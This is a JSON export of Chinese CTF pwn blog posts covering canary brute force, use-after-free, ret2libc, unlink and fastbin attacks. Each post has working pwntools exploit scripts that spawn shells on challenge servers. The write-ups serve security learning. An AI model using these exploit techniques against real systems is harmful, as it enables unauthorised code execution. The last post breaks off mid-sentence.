[{"title":"Canary爆破","url":"/2025/01/25/Canary%E7%88%86%E7%A0%B4/","content":"ctfshow53（1）checksec\n发现并没有开canary保护，其实这道题只是在栈上放了一个作用与canary类似的，程序运行过程中也会比较它的值是否改变\n思路：我们可以逐字节的将canary爆破出来\n（2）ida代码审计\n看看Canary\n\n意思就是先声明了一个指针变量  stream，打开canary.txt文件，如果没有这个文件就退出，如果有使用  fread 函数从打开的文件中读取 4 个字节的数据存储在全局变量global_canary\n看看ctfshow\n\n  将global_canary赋给s1，然后是一个while循环， 使用read函数读取字符到v2中，直至遇到换行符 \\n（ASCII码为10）停止，v5记录存储的个数，每当存储一次v5的值就+1，，然后使用  __isoc99_sscanf 函数将  v2 中的字符串转换为整数，并存储到  nbytes 中，nbytes为size_t 类型无符号型，当我们输入-1时候就会被解释为一个非常大的数（（通常是 0xFFFFFFFF，即 size_t 类型的最大值）），所以我们可以输入-1来绕过while循环，并且可以利用第二个read进行栈溢出\n最后if循环就是比较canary的值是否改变的，将s1的值与global_canary比较如果不一样输出”Error *** Stack Smashing Detected *** : Canary Value Incorrect!”并且退出，一样的话输出”Where is the flag?”\n最后flag\n\n意思就是打开flag的文件，通过puts函数将flag的值输出\n（3）思路\n先将canary逐个字节爆破出来，然后通过栈溢出返回到flag的地址就可以\n1.canary爆破爆破canary s1中储存的就是canary的值，我们可以先覆盖0x20个数据覆盖到s1，然后一个字节一个字节的去覆盖s1的值，因为只覆盖一个字节，其他的不变，通过看puts函数输出的值判断是否覆盖正确，当第一个字节正确就把他记录下来，然后爆破第二个字节时，再将第一个字节输入进去再爆破第二个字节，依次类推，这里我们可以借助脚本去爆破,粘贴一个大佬写的脚本我来解释一下\nfrom pwn import *canary = b&#x27;&#x27;                                           #定义canaryfor i in range(4):                                     #这里是两层循环，因为canary是四个字节所以外层循环4次    for j in range(0x100):                             #这个循环尝试所有可能的字节值（从 0x00 到 0xFF）        p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28179)              p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;200&#x27;)                   #200为用户名        payload = b&#x27;a&#x27;*0x20 + canary + p8(j)           #先覆盖0x20到canary，在覆盖已经试出来前几个字节canary的值，再加上                                                         要尝试的        p.sendafter(&#x27;$ &#x27;, payload)                             ans = str(p.recv())                            #将接收的的值转化为字符串赋值给ans        if &quot;Canary Value Incorrect!&quot; not in ans:       #这个if循环是判断逐字节爆破的canary是否正确，我们知道错误就会输出                                                        Canary Value Incorrect!，如果我们接收到的数据中没有Canary Value                                                        Incorrect!就证明是正确的            canary += p8(j)                            #将新爆破出来的值加到已经爆破出来的值的后面            print(f&quot;NO:&#123;i+1&#125;  &#123;hex(j)&#125;&quot;)               #因为i是取0-3的整数，所以要+1才是canary的第几个值            break                                      #退出循环        else:            print(f&quot;try again! &#123;i&#125;:&#123;j&#125;&quot;)print(f&quot;canary: &#123;hex(u32(canary))&#125;&quot;)                   #最后将canary的值转换为32位输出出来\n\n2.栈溢出exp\nfrom pwn import *p=remote(&#x27;pwn.challenge.ctf.show&#x27;,28179)canary=0x21443633                              #canary上面爆破过了，我们直接输入就可以，前提是canary的值是固定的flag=0x08048696p.recvuntil(b&#x27;How many bytes do you want to write to the buffer?\\n&gt;&#x27;)  p.sendline(b&#x27;-1&#x27;)                              #绕过while循环，并使得可以借助read函数栈溢出p.recvuntil(b&#x27;$ &#x27;)                            pay=b&#x27;a&#x27;*0x20+p32(canary)+b&#x27;a&#x27;*(0xc+0x4)+p32(flag) #payload=覆盖到s1+canary+覆盖到返回地址+返回地址p.sendline(pay)p.interactive()\n\n参考文章ctfshowpwn 45 -＞ 90（已更新33）栈溢出_pwn59-CSDN博客\ncanary保护和pie保护的绕过_ctfshow pwn入门-CSDN博客\n","categories":["第二周"],"tags":["wp"]},{"title":"UAF","url":"/2025/11/18/UAF/","content":"\n原理 :简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况\n\n内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。\n内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。\n内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。\n\n而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。\n例题  ida：unsigned int add_note()&#123;    int v0; // ebx    int i; // [esp+Ch] [ebp-1Ch]    int size; // [esp+10h] [ebp-18h]    char buf[8]; // [esp+14h] [ebp-14h] BYREF    unsigned int v5; // [esp+1Ch] [ebp-Ch]    v5 = __readgsdword(0x14u);    if ( count &lt;= 5 )    &#123;        for ( i = 0; i &lt;= 4; ++i )        &#123;            if ( !*(&amp;notelist + i) )            &#123;                *(&amp;notelist + i) = malloc(8u);                if ( !*(&amp;notelist + i) )                &#123;                    puts(&quot;Alloca Error&quot;);                    exit(-1);                &#125;                *(_DWORD *)*(&amp;notelist + i) = print_note_content;                printf(&quot;Note size :&quot;);                read(0, buf, 8u);                size = atoi(buf);                v0 = (int)*(&amp;notelist + i);                *(_DWORD *)(v0 + 4) = malloc(size);                if ( !*((_DWORD *)*(&amp;notelist + i) + 1) )                &#123;                    puts(&quot;Alloca Error&quot;);                    exit(-1);                &#125;                printf(&quot;Content :&quot;);                read(0, *((void **)*(&amp;notelist + i) + 1), size);                puts(&quot;Success !&quot;);                ++count;                return __readgsdword(0x14u) ^ v5;            &#125;        &#125;    &#125;    else    &#123;        puts(&quot;Full&quot;);    &#125;    return __readgsdword(0x14u) ^ v5;&#125;\n\n解释：\n1.申请两个堆块第一个堆块大小0x8（加上堆的头部0x10）并将堆指针所在的地址的内容写为（print_note_content）\n2.申请第二个堆块大小自己定作为用户数据段（但是也有堆头也就是0x28），并将堆指针所在地址后面四个字节写入第二个堆块的指针所指的地址\nunsigned int del_note()&#123;  int v1; // [esp+4h] [ebp-14h]  char buf[4]; // [esp+8h] [ebp-10h] BYREF  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;);  read(0, buf, 4u);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt;= count )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;notelist + v1) )  &#123;    free(*((void **)*(&amp;notelist + v1) + 1));    free(*(&amp;notelist + v1));    puts(&quot;Success&quot;);  &#125;  return __readgsdword(0x14u) ^ v3;&#125;\n\n清空两个堆块，但没有将指针置零，指针变为悬挂指针\nunsigned int print_note()&#123;  int v1; // [esp+4h] [ebp-14h]  char buf[4]; // [esp+8h] [ebp-10h] BYREF  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;);  read(0, buf, 4u);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt;= count )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;notelist + v1) )    (*(void (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));  return __readgsdword(0x14u) ^ v3;&#125;\n\n引用后得到的函数指针所指向的函数(也就是print_note_content)，同时将 *(&amp;notelist + v1) 作为参数传递给该函数（也就是将堆块的内容打印出来）\nUAF漏洞定义堆 UAF 漏洞指的是程序在释放堆内存之后，没有将对应的指针置为 NULL，并且后续代码又对该已经释放的内存进行了访问操作。这种情况下，被释放的内存可能会被重新分配给其他对象使用，此时对原指针的访问就会导致数据混乱、程序崩溃，甚至可能被攻击者利用来执行任意代码\n原理简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况\n\n内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。\n内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。\n内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题\n\n思路：\n申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）\n申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）\n释放 note0\n释放 note1\n此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0\n申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则\nnote2 其实会分配 note1 对应的内存块。\nreal content 对应的 chunk 其实是 note0。\n如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数\n\nfrom pwn import *r = process(&#x27;./hacknote&#x27;)def addnote(size, content):    r.recvuntil(&quot;:&quot;)    r.sendline(&quot;1&quot;)    r.recvuntil(&quot;:&quot;)    r.sendline(str(size))    r.recvuntil(&quot;:&quot;)    r.sendline(content)def delnote(idx):    r.recvuntil(&quot;:&quot;)    r.sendline(&quot;2&quot;)    r.recvuntil(&quot;:&quot;)    r.sendline(str(idx))def printnote(idx):    r.recvuntil(&quot;:&quot;)    r.sendline(&quot;3&quot;)    r.recvuntil(&quot;:&quot;)    r.sendline(str(idx))magic = 0x08048986addnote(32, &quot;aaaa&quot;)addnote(32, &quot;ddaa&quot;)gdb.attach(r)delnote(0)delnote(1)#gdb.attach(r)addnote(8, p32(magic))#gdb.attach(r)printnote(0)r.interactive()\n\n申请四个堆块（也就是两个0，1），将两个堆块free，在申请一个（2），这时候之前申请的两个0x10的堆块就会被重新启用，先free的A的指针内的内容就会被改为后门地址，print_note（0），本来会调用print_note_content，但是内容被改为了后门地址就会调用后门的函数获得shell\n为什么不是print_note（1），因为申请一次堆块其实是申请出来了两个堆块，第二个堆块内才被写入数据，所以不是print_note（1）\n","categories":["堆"],"tags":["知识点"]},{"title":"ctfshow 43，44","url":"/2025/01/22/ctfshow/","content":"pwn43ida：\n\n发现gets可以栈溢出（0x6c+0x4），但是并没有找到bin&#x2F;sh或sh字符串，但是有system\n\n运行gdb使用vmmap命令即可观察到各段的权限信息\n我们发现0x804b000-0x804c000是可写的\n\n-p 标志表示内存区域的权限，它由四个字符组成，每个字符分别代表一个权限：\nr：可读（Readable）w：可写（Writable）x：可执行（Executable）s：共享（Shared）\n我们在bss段找到了变量buf2是可写的\n通常情况下，BSS 段下的变量是可写的。BSS 段是用来存储未初始化的全局变量和静态变量的，操作系统在程序加载时会为这些变量分配内存并将其初始化为零或空指针。因此，BSS 段下的变量通常具有读写权限，可以被程序写入数据。\n\n思路：我们可以调用gets函数将&#x2F;bin&#x2F;sh字符串写入变量buf2，在传递给system函数的第一个参数就构造成功了system(“&#x2F;bin&#x2F;sh”)\ngets：0x08048420\nsystem：0x08048450\nexp：\nfrom pwn import*io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)buf2 = 0x0804B060system = 0x08048450gets = 0x08048420payload= b&#x27;a&#x27;*(0x6c+0x4)payload += p32(gets)payload += p32(system)   #作为gets函数的返回地址，返回到system函数中payload += p32(buf2)     #作为gets函数的参数（发送的/bin/sh将会被写入buf2），也是system函数的返回地址(是无效的)payload += p32(buf2)     #system函数的参数io.sendline(payload)io.sendline(b&quot;/bin/sh&quot;)io.interactive()\n\npwn44这道题思路与pwn43一样只不过是64位的，传参方式不同\n\n栈溢出（0xa+0x8）\n\nsystem：0x0400520\ngets：0x0400530\nfrom pwn import*io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28255)buf2 = 0x602080system = 0x0400520gets = 0x0400530ret = 0x00000000004004ferdi = 0x00000000004007f3payload= b&#x27;a&#x27;*(0xa+0x8)payload += p64(rdi)  payload += p64(buf2)payload += p64(gets)payload += p64(rdi)payload += p64(buf2)    payload += p64(system)    io.sendline(payload)io.sendline(b&quot;/bin/sh&quot;)io.interactive()\n\n总结pwn33，34（1）解题思路当没有bin&#x2F;sh或者sh字符串时，但是bss存在未初始化的变量，我们可以调用gets，read等函数将&#x2F;bin&#x2F;sh字符串写入将其作为system的第一个参数，构造system(“&#x2F;bin&#x2F;sh”)\n（2）64位与32位栈溢出后函数调用的不同\n32位调用函数参数全在栈上，64位前是7个参数放在寄存器里，后面的放在栈上面。\n\n32位调用函数压栈顺序是先压参数最后压返回函数，64位先是压入返回函数然后将参数放在寄存器\n\n\n","categories":["第二周"],"tags":["wp"]},{"title":"Unlink","url":"/2025/11/18/Unlink/","content":"\n一.堆溢出unlink条件：当使用 free 函数释放一个堆块时，如果相邻的堆块（前一个或后一个）也处于空闲状态，就可能触发 unlink 操作，以将相邻的空闲堆块合并成一个更大的空闲块，从而提高内存的利用率。具体来说，如果被 free 的堆块的 P 位为 0，说明其前一个堆块为空，就会对前一个堆块进行 unlink 操作，将前一个堆块与当前被 free 的堆块进行后向合并；如果相邻的下一个堆块处于空闲状态，则会进行向前合并。\nunlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量\n也就是这样\n\n那具体拖链是如何实现的\nFD = P-&gt;fd;                                   \\BK = P-&gt;bk;                                   \\FD-&gt;bk = BK;                                  \\BK-&gt;fd = FD;                                  \\\n\n也就是我的上一个的下一个&#x3D;我的下一个，我的下一个的上一个&#x3D;我的上一个\nFD &#x3D; p-&gt;fd \nFD &#x3D; 堆块3chunk头所在的地址\nBK &#x3D; P-&gt;bk;\np-&gt;bk\nBK &#x3D; 堆块1chunk头所在的地址 \nFD-&gt;bk &#x3D; BK;\n堆块3的bk指针指向BK（堆块1chunk头所在地址）\nBK-&gt;fd &#x3D; FD;\n堆块1的fd指针指向FD（堆块3chunk头所在地址）\nif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                        malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);\n\n这个也就是p–&gt;fd–&gt;bk &#x3D; p–&gt;bk–&gt;fd &#x3D; p\n堆块2的下一个堆块的上一个堆块 &#x3D; 堆块2的上一个堆块的下一个堆块&#x3D;堆块2\n那么如何绕过与利用呢？\n\n就解释一点吧\nchunk &#x3D; 0x602280\n为什么BK-&gt;fd &#x3D;&#x3D; *(0x602270+0x10)\n因为chunk头-0x18就是bk指针所在的地址，*（）也就是解引用bk指针的值，正常得到的是上一个堆块的chunk头所在的地址，在这里得到的就是堆块2chunk头所在的地址\n在这里BK-&gt;fd &#x3D;FD，就是*(0x602270+0x10) &#x3D; 0x602268\n也就是往chunk里面写入了chunk-0x18的值\n也就是将堆指针指向的地址改成了chunk-0x18\n然后我们往堆块2中写入东西，他就会往堆指针指向的地址里面写，也就是往这个地址里面写0x602268，顺着往下写就会写入0x602280，那么就可以将堆的指针指向的地址改为任意值，就实现任意地址写了\n我们结合题目看一下\n最最最重要的，要把头部构造在指针的位置\n触发unlink一定要伪造一个free掉的堆块在指针处，因为unlink比较是和头部比较，而数组中存储的是指针的值，所以要伪造头部在指针处才能绕过保护\n1.有打印堆块的功能add(0x80,b&#x27;chunk0&#x27;)add(0x80,b&#x27;chunk1&#x27;)#bug()payload = p64(0)+p64(0x81)+p64(0x06020C8-24)+p64(0x06020C8-16)+b&#x27;a&#x27;*0x60+p64(0x80)+p64(0x90)edit(0,0x90,payload)free(1)payload = b&#x27;a&#x27;*24+p64(elf.got[&#x27;atoi&#x27;])edit(0,len(payload),payload)\n\n申请两个在unsortbin的堆块，在堆块0中伪造一个free的堆块，并将堆块2的pre_inuse位设为0，这样就伪造堆块0为free掉的堆块，free堆块1就会触发unlink\nchunk &#x3D; 0x06020C8\nfd &#x3D; chunk-0x18\nbk &#x3D; chunk -0x10\n看一下gdb\n\n会很明显是往chunk里面写入了chunk - 0x18\n然后我们接着修改堆块的内容，也就是往chunk - 0x18中写入数据，先写0x18个垃圾数据，然后再写的就是往chunk中写，也就是往指针所在的地址写，改变指针所存储的值，也就是指针指向的地址\n我们将他写为atoi\npayload &#x3D; b’a’*24+p64(elf.got[‘atoi’])\n\n可以看到已经成功了\n此时可以泄露libc，我们打印这个堆块，就会将atoi的真实地址打印出来\n我们再次修改这个堆块的内容，也就是修改atoi的got表，把他改成system，在调用atoi的时候就会触发system，获得shell\n2.没有打印堆块的功能没有打印堆块，我们就无法泄露libc，但是我们通过都能实现任意地址写了，我们可以将free的got表改为puts\nfree堆块时候，就可以打印\n我们观察gdb，看具体是如何实现的\n将第一个堆块指针指向的地址改为free的got表\n第二个改为atoi的got表\n然后修改第二个堆块的内容为puts函数的plt表这样free堆块时候，就会打印处来堆块的内容，泄露libc\n\n然后在修改堆块2的内容为system的真实地址\n在申请一个堆块，内容写为&#x2F;bin&#x2F;sh\\x00\nfree这个堆块就可以获得shell\nadd(0x10)add(0x80)add(0x80)FD = 0x602150-24BK = 0x602150-16payload = p64(0)+p64(0x81)+p64(FD)+p64(BK)+b&#x27;a&#x27;*0x60+p64(0x80)+p64(0x90)edit(2,len(payload),payload)free(3)payload = p64(0)*2+p64(elf.got[&#x27;free&#x27;])+p64(elf.got[&#x27;atoi&#x27;])edit(2,len(payload),payload)#bug()edit(1,0x8,p64(elf.plt[&#x27;puts&#x27;]))free(2)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))-libc.sym[&#x27;atoi&#x27;]print(hex(libc_base))system = libc_base+libc.sym[&#x27;system&#x27;]edit(1,0x8,p64(system))add(0x10)payload = b&#x27;/bin/sh\\x00&#x27;edit(4,len(payload),payload)#bug()free(4)\n\n最后：需要注意触发unlink free的堆块的上一个需要是free状态，所以我们要伪造堆块2为free状态，让后free堆块3就会触发unlink\n那具体是如何伪造的？\n我们在堆块2中再伪造一个假堆块\n使pre_size &#x3D; 0\n   size &#x3D; 0xn1(n为伪造堆块大小)\n   fd &#x3D; chunk-0x18\n   bk &#x3D; chunk-0x10\n使堆块3\n  pre_size &#x3D; 0xn0\n  size &#x3D; size(本堆块大小，0xm0) p位为0\n这样就伪造堆块2为free状态，然后free堆块3，触发unlink，实现chunk &#x3D; chunk-0x18\n当off  by one&#x2F;null时候因为会多一个字节，free后面就是puts，puts的got表就会被破坏，所以要这样子改，将puts的got表改为printf\nedit(6,b&#x27;a&#x27;*51+p64(elf.got[&#x27;free&#x27;])+p64(elf.got[&#x27;atoi&#x27;]))edit(0,p64(elf.plt[&#x27;puts&#x27;])+p64(elf.plt[&#x27;printf&#x27;]))bug()free(1)atoi = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(hex(atoi))libc_base = atoi-libc.sym[&#x27;atoi&#x27;]print(hex(libc_base))bug()system = libc_base +libc.sym[&#x27;system&#x27;]edit(3,&#x27;/bin/sh&#x27;)edit(0,p64(system)+p64(elf.plt[&#x27;printf&#x27;]))#bug()free(3)\n\n\n\n这里也能看到多了一个0xa\n","categories":["堆"],"tags":["知识点"]},{"title":"2024湘岚杯ezlibc","url":"/2025/01/18/ezlibc/","content":"前言\n\n本题是Canary保护+ret2libc，根据这个题目来总结一下canary保护和ret2libc\nCanary保护（1）Canary介绍Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。\n（2）Canary原理当函数开始执行时，会在内存某处插入一组随机数canary（一般是 寄存器fs: 0x28 处，栈中 %ebp-0x8 的位置），我们在直接进行栈溢出时canary的值就会改变，在函数退栈返回前，程序会比对栈上的canary副本和原始的canary。如果二者不同，则说明发生了栈溢出，这时程序会直接崩溃，调用__stack_chk_fail函数来终止程序\n\n\n（3）Canary绕过我们知道在进行栈溢出时Canary的值已经改变，但函数退栈返回前程序会比对Canary的值，我们可以先把Canary泄露出来，进行栈溢出时候，再把Canary的值发送，这样Canary的值就不会改变\n（4）Canary特点Canary所生成的随机数有一个非常重要的特点：随机数的第一个字节必然是 0x00。如此设计的主要目的是实现字符串截断，当我们进行泄露时遇到0x00直接就停止了，但是我们进行栈溢出时，可以多发送一个字节，使\\x00被覆盖，这样我们就可以成功的将Canary泄露出来\nret2libc（1）题目特点进行栈溢出时，程序可能没有后门函数，可能既没有system函数，又没有”&#x2F;bin&#x2F;sh”字符串，我们就无法拿到shell，但是我们可以借助libc库将其真实地址计算出来\n（2）解题思路我们知道函数的真实地址  &#x3D;  基地址  +  偏移地址 ，如果我们知道每次程序运行的基地址，以及每个函数的偏移地址，我们就可以计算出函数的真实地址\n基地址：每次运行程序加载函数时，函数的基地址都会发生改变\n偏移地址：libc库中存放的就是这些函数的偏移地址，函数真实地址的后三位不会变化，根据其最后三位借助，可以判断出libc库的版本\n查询libc版本网站：libc database search\n使用方法：输入函数名称和真实地址\n如何计算基地址：\n我们知道基地址 &#x3D; 函数的真实地址 - 偏移地址\n我们可以借助puts(),write()这样的函数将某个函数的真实地址打印出来（即got表中存放的地址），由于Linux的动态延迟绑定技术，我们必须选择一个main函数中已经执行过的函数，一般选择puts和write\n（4）plt表和got表 PLT表（Procedure Linkage Table）：PLT表用于实现函数调用的延迟绑定。当程序调用一个外部函数时，首先会跳转到PLT表中的相应条目，PLT表中的代码会检查GOT表中该函数地址是否已经解析。如果已经解析，就直接跳转到GOT表中的实际函数地址；如果尚未解析，就会触发动态链接器进行解析操作，然后更新GOT表并完成函数调用\nGOT表（Global Offset Table）：GOT表用于存放外部函数和全局变量的地址。GOT表在动态链接过程中起着关键作用，它允许程序在运行时查找和调用外部函数。\n在这里引用一张大佬的图解释\n\n（5）延迟绑定定义：延迟绑定（Lazy Binding）是一种在程序运行过程中动态链接共享库函数的技术。它的核心思想是推迟对外部函数（位于共享库中的函数）的地址解析，直到程序首次调用该函数时才进行解析。这样做的主要目的是为了提高程序的启动速度，因为如果在程序启动时就对所有可能用到的外部函数进行地址解析，会花费大量时间，而且很多函数可能在程序运行过程中根本不会被调用\n调用函数A的过程\n首次调用：\n\n再次调用:\n\n（6）总结1.找到一个main函数中已经执行过的函数，构造payload1调用puts或write将其真实地址打印出来，根据真实地址确定libc版本，以及函数的偏移地址\n2.根据基地址&#x3D;真实地址-偏移地址\n3.根据真实地址&#x3D;基地址+偏移地址算出system函数和”&#x2F;bin&#x2F;sh”字符串的真实地址\n4.构造payload2，劫持程序，拿到shell\nexp以及解释from pwn import *from LibcSearcher import *io=process(&#x27;./ezlibc&#x27;)elf=ELF(&quot;./ezlibc&quot;)io=remote(&#x27;xlctf.huhstsec.top&#x27;,40657)context(arch=&quot;amd64&quot;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#payload1:泄露canarypayload1=b&#x27;a&#x27;*(0x30-0x8)+b&#x27;b&#x27;                                 #多发送一个b来覆盖canary的\\x00io.recvuntil(b&#x27;flag!&#x27;)io.send(payload1);                                            #这里不能用sendline，因为回车会占字节io.recvuntil(b&#x27;ab&#x27;)                                           #定位到Canary之前canary=u64(b&#x27;\\x00&#x27;+io.recv(7))                                #接受canary将\\x00重新填上，再接受7个字节，并转换为64位print(&#x27;canary:&#x27;,hex(canary))pop_rdi_ret_addr=0x400843ret_addr=0x000000000040059e               puts_plt=elf.plt[&#x27;puts&#x27;]                                      #查找puts函数plt表的地址main_addr=0x4006e7puts_got=elf.got[&quot;puts&quot;]                                      #查找puts函数got表的地址print(&quot;puts_plt:&quot;,hex(puts_plt))print(&quot;plt_got:&quot;,hex(puts_got))#payload2:泄露puts真实地址payload2=b&#x27;a&#x27;*(0x30-8)+p64(canary)+b&#x27;a&#x27;*8                     #先覆盖到到canary之前，再将canary发送payload2+=p64(pop_rdi_ret_addr)+p64(puts_got)                 #将puts函数got表的地址储存在寄存器rdi里  payload2+=p64(puts_plt)                                       #调用puts函数payload2+=p64(main_addr)                                      #最后返回到main，再次进行栈溢出  io.recvuntil(b&quot;Maybe UR closer to the key&quot;)                     io.sendline(payload2)puts_addr = u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))  #接收puts函数的真实地址，从7f开始接收，长度补足8个字节print(&quot;real addr:&quot;,hex(puts_addr))libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)                           #查询libc版本base=puts_addr-libc.dump(&#x27;puts&#x27;)                              #计算基地址system=base+libc.dump(&#x27;system&#x27;)                               #计算system函数地址bin_sh=base+libc.dump(&#x27;str_bin_sh&#x27;)                           #计算/bin/sh字符串地址#payload3：构造调用system(&quot;/bin/sh&quot;)payload3=b&#x27;a&#x27;*(0x30-8)+p64(canary)+b&#x27;a&#x27;*8      payload3+=p64(ret_addr)                                       #栈平衡payload3+=p64(pop_rdi_ret_addr)+p64(bin_sh)                   #将/bin/sh的地址储存在rdi寄存器中payload3+=p64(system)io.sendline(payload3)io.interactive()\n\n最后题目为我们提供Libc版本.so文件, 与 不提供的区别（1）当题目不提供libc.so文件我们就需要借助LibcSearche库from LibcSearcher import *libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)  base=puts_addr-libc.dump(&#x27;puts&#x27;)                              #计算基地址system=base+libc.dump(&#x27;system&#x27;)                               #计算system函数地址bin_sh=base+libc.dump(&#x27;str_bin_sh&#x27;)                           #计算/bin/sh字符串地址\n\n(2)当题目提供libc.so文件libc=ELF(&#x27;libc-2.23.so&#x27;)base=puts_addr-libc.sym[&#x27;puts&#x27;]                              #计算基地址system=base+libc.sym[&#x27;system&#x27;]                               #计算system函数地址bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))           #计算/bin/sh字符串地址\n\n参考文章：canary：canary介绍与绕过技巧_金丝雀漏洞缓解-CSDN博客\n​\t      pwn入门之canary保护_pwn canary-CSDN博客\nret2libc:pwn入门：基本栈溢出之ret2libc详解（以32位+64位程序为例）-CSDN博客\nexp:[【PWN · ret2libc | Canary】2021 鹤城杯]littleof-CSDN博客\n区别：CTF(Pwn) 当题目为我们提供Libc版本.so文件, 与 不提供的区别_ctf题中.so文件-CSDN博客\n","categories":["第二周"],"tags":["wp"]},{"title":"fastbin attack","url":"/2025/11/18/fastbin-attack/","content":"\n1.Fastbin Double FreeDouble free及将一个堆块free两次，gdb中如下图所示\n\n这样我们就可以将两个堆块申请在同一个位置，其中一个堆块是free状态，我们可以通过另一个堆块对fd指针进行修改\nFastbin Double Free能够成功利用的原因：\n1.fastbin的堆块被释放后next_chunk的prev_inuse位不会被清空\n2.fastbin在执行free的时候仅验证了main_arena直接指向的块，即链表指针头部的块。对于链表后面的块并没有进行验证\n2.fastbin dump into stack顾名思义，将堆块申请在栈上，控制栈上的数据，利用uaf漏洞，将fd指针改为要控制数据的地址-0x10（因为fd指针指的是堆块的头部，所以需要-0x10，才刚好使数据段落在要要控制数据的栈上），修改堆块的内容就可以控制栈上的数据\n注：首先要伪造size位（0xn1）\nISMMAP位不能为1\ninues位为0\nsize位为0x40\n地址要64位：0&#x2F;8\n​          32位：0&#x2F;4  对齐\n在内存中构造了一个了一个堆块，还要怎么样才能让它   free\n扩展用在fastbin attack打mallco使申请堆块大小受限制（&lt;&#x3D;0x60,也就是没发使堆块的size位为0x71）\n在2.23和2.27的libc版本中，由于没有对top chunk的size合法性进行检查，所以我们把top_chunk的地址改了，就能申请任意地址\n直接改top chunk的地址\n申请一个size位为0x31的堆块，free掉，修改fd指针为0x61，再将这个堆块申请出来，这样main_arena中存储大小为0x30的堆块的数组就会存上0x61（为了伪造size位）\n\n然后我们申请一个size位为0x61的堆块，free掉，修改指针到main_arena-80的地方这样，申请两次，将main_arena-80的堆块申请出来，因为main_arena-80与top chunk的地址紧挨着，所以可以写数据覆盖top chunk\n为什么要是main_arena-80看图\n\n这样可以伪造一个size位，堆块才能被申请在这里\n\n具体写多少自己数\nadd(0,0x20)add(1,0x20)free(0)edit(0,p64(0x61))add(2,0x20)add(3,0x50)free(3)edit(3,p64(0x7ffff7bc4b28))add(4,0x50)add(5,0x50)bug()payload = p64(8)*8+p64(0x7ffff7bc4aed)edit(5,payload)\n\n3.fastbin dup consolidate#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;int main() &#123;  void* p1 = malloc(0x40);  void* p2 = malloc(0x40);  fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\\n&quot;, p1, p2);  fprintf(stderr, &quot;Now free p1!\\n&quot;);  free(p1);  void* p3 = malloc(0x400);  fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\\n&quot;, p3);  fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\\n&quot;);  free(p1);  fprintf(stderr, &quot;Trigger the double free vulnerability!\\n&quot;);  fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\\n&quot;);  fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice: %p %p\\n&quot;, malloc(0x40), malloc(0x40));&#125;\n\n申请两个堆块大小范围在fastbin，p2是为了防止触发malloc_consolidate 使得p1被合并进入top_chunk\nfree掉p1进入fastbin申请0x400的大小的chunk，这时触发malloc_consolidate，p1就会被放在unsortbin\n因为这时候p1已经不在fastbins了，可以再次free一次触发double free\n这时候申请两次\n第一次会把 fastbin 中的 p1 chunk 给 malloc 出来，然后 fastbin 为空\n第二次会把 unsorted 中的 p1 chunk 给 malloc 出来，所以会能 malloc 到两次一样的 chunk\n效果: 首先它会像unsortedbin（small）一样将相邻高地址的堆块inuse位置零同时也会被放进unsortedbin链表中(即存在fd和bk的使用), 其次它依旧满足fastbin的free堆块inuse位不置零, 那么如果存在有off by one或者其写入大小符合在不free时可以写入下一个chunk的pre_size, 